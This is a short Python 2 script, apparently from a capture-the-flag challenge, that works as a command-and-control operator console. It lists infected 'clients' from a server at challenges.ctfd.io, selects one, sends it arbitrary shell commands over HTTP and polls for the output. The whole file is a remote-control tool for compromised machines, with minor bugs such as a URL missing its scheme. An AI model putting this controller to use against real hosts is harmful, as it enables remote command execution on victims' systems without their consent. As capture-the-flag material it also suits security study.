#! /usr/bin/python

import json
import requests
import time

BASE_URL = "challenges.ctfd.io:30020"


def main():
    currentID = ""
    online = []
    offline = []

    while True:
        cmd = raw_input("C2 [" + currentID + "]> ")

        # Quit
        if cmd.lower() == "quit" or cmd.lower() == "exit":
            break

        # Get ids
        elif cmd.lower() == "get ids":
            ids = getIDS()
            online = ids[0]
            offline = ids[1]

            print "[*] " + str(len(online)) + " Online Clients"
            for i, c in enumerate(online):
                print "  {} - {}".format(i, c)
            print ""

            print "[*] " + str(len(offline)) + " Offline Clients"
            for i, c in enumerate(offline):
                print "  {} - {}".format(i+len(online), c)

        # List ids
        elif cmd.lower() == "ids":
            print "[*] " + str(len(online)) + " Online Clients"
            for i, c in enumerate(online):
                print "  {} - {}".format(i, c)
            print ""

            print "[*] " + str(len(offline)) + " Offline Clients"
            for i, c in enumerate(offline):
                print "  {} - {}".format(i+len(online), c)

        # Set id index
        elif cmd[0:3].lower() == "set":
            if int(cmd[4:]) > len(online):
                currentID = offline[int(cmd[4:])]
            else:
                currentID = online[int(cmd[4:])]

        # Send command
        else:
            cmdOutput = sendCMD(currentID, cmd)
            if cmdOutput:
                print "Command sent successfully. Waiting for output."
                out = getOutput(currentID)
                while out == "":
                    time.sleep(5)
                    out = getOutput(currentID)
                print out

            else:
                print "Invalid ID"


def sendCMD(id, cmd):
    resp = requests.post(BASE_URL + "/cmd", data={"id": id, "cmd": cmd})
    r = json.loads(resp.text)

    return r['status'] != 'fail'


def getIDS():
    resp = requests.get(BASE_URL + "/clients")
    r = json.loads(resp.text)

    return [r['online'], r['offline']]


def getOutput(id):
    resp = requests.get(BASE_URL + "/output", data={'id': id})
    r = json.loads(resp.text)

    if r['status'] == 'fail':
        return False
    else:
        return r['output']


if __name__ == "__main__":
    main()
